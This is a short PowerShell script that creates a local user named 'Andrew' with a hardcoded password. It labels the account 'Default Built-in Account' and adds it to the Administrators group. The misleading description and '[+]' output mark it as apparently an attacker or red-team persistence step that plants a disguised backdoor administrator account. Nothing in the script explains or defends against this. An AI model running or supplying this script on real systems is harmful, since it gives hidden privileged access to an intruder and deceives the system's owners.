﻿#region create local user
$password = 'asdfADF123!@#'
$passwordSecureString = ConvertTo-SecureString -String $password -AsPlainText -Force
New-LocalUser -Name "Andrew" -Description "Default Built-in Account" -Password $passwordSecureString
Write-Host "[+] Andrew added as local user; password: $password"
#endregion

#region add new user to local admins group
Add-LocalGroupMember -Group 'Administrators' -Member 'Andrew'
